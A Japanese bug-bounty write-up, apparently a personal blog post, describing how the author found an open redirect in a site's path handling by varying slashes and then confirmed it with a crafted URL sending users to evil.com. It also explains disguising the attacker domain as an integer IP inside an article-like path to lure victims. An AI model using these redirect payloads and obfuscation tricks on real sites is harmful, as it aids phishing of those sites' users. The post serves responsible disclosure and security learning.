---
lang: ja
---

# Request-URIのパスからのオープンリダイレクト 実践編

<time datetime="2018-12-17">2018年12月17日</time>

---

とある企業の非公開報奨金制度で[Request-URIのパスからのオープンリダイレクト](/2018/open_redirect_via_path.md)を発見した。その検出に至るまでの手順が興味深く、HackerOneのレポートにも類似の挙動は見当たらなかったため、詳細をまとめておく。

対象サイトのトップにアクセスした際の正常なレスポンスは以下である。パスの値によるレスポンスの変化を手掛かりに脆弱性を発見した。

hxxps://www[.]example.com/

```http
HTTP/1.1 200 OK
...
<title>Example Domain</title>
```

## 検出手順

まず、任意のパスに `GET /xxx HTTP/1.1` でリクエストすると、トレイリングスラッシュを追加するリダイレクトが発生する。

hxxps://www[.]example.com/xxx

```http
HTTP/1.1 301 Moved Permanently
...
Location: /xxx/
```

つぎに、ドメイン直後のスラッシュを2つにして `GET //xxx HTTP/1.1` でリクエストするも、レスポンスに変化は見られない。

hxxps://www[.]example.com//xxx

```http
HTTP/1.1 301 Moved Permanently
...
Location: /xxx/
```

しかし、スラッシュを3つにして `GET ///xxx HTTP/1.1` でリクエストすると、トップへのリダイレクトが発生する。

hxxps://www[.]example.com///xxx

```http
HTTP/1.1 301 Moved Permanently
...
Location: /
```

また、トレイリングスラッシュを追加して `GET ///xxx/ HTTP/1.1` でリクエストすると、トップのコンテンツが返る。

hxxps://www[.]example.com///xxx/

```http
HTTP/1.1 200 OK
...
<title>Example Domain</title>
```

さらに、トレイリングスラッシュの直後に `zzz` を追加すると、上位階層の `xxx` を無視したリダイレクトとなる。

hxxps://www[.]example.com///xxx/zzz

```http
HTTP/1.1 301 Moved Permanently
...
Location: /zzz/
```

そこで、`zzz` の直前のスラッシュを2つにしてリクエストすると、レスポンスのLocationヘッダの先頭に `//` を挿入できた。

hxxps://www[.]example.com///xxx//zzz

```http
HTTP/1.1 301 Moved Permanently
...
Location: //zzz/
```

## 実証

Locationヘッダに `//` から始まるスキームを省略した形式の絶対パスを挿入することで、外部サイトへのリダイレクトが発生する。

hxxps://www[.]example.com///xxx//evil.com

<figure><img src="/assets/2018/practical_open_redirect_via_path/open_redirect.webp" width="770" height="204" decoding="async" alt="" /></figure>

上記のURLには攻撃者の所有するドメインが含まれているため、警戒心の強い被害者は不信感を抱く可能性が高い。固定IPアドレスが振られたドメインであれば整数変換により難読化できる。例えば `evil.com` のIPアドレス `66.96.146.129` は `1113625217` に変換できる<sup id="f1">[¹](#fn1)</sup> <sup id="f2">[²](#fn2)</sup>。パスに含まれる階層 `xxx` は任意の文字列に置き換えられるため、攻撃者は対象サイトの特性に合わせて以下のようなURLに偽装することで被害者を誘導できるだろう。

hxxps://www[.]example.com///articles//1113625217/index.html

```http
HTTP/1.1 301 Moved Permanently
...
Location: //1113625217/index.html/
```

## 所感

Request-URIのパスからの入力に起因する脆弱性の検出は、サイト仕様の把握やアカウント作成などの事前準備が不要なため、気軽に調査を開始できる。今回は `//xxx` と `///xxx` のレスポンスの差異に気付けたため、その挙動をオープンリダイレクトにつなげられた。気軽に何も考えずにスラッシュを3つ入力したことが要因となった。

発見した脆弱性はサイト運営会社の報奨金制度へ報告した。Severity（深刻度）はLowと評価されたため報奨金は$100〜$500になる見込み。さらにスコープ内の他4つのドメインでも同様の脆弱性を発見し、それぞれ認定されている。少額な脆弱性も横展開できるとおいしい。

---

<sup id="fn1">[¹](#f1)</sup> DNSの逆引きができないため、実際には `1113625217` にアクセスしても `evil.com` は表示されない。一例として記載する。  
<sup id="fn2">[²](#f2)</sup> 変換後のIPアドレスは[How to Obscure Any URL](http://www.pc-help.org/obscure.htm)を参考に `66 * 256 + 96 = * 256 + 146 = * 256 + 129 =` で求めた。
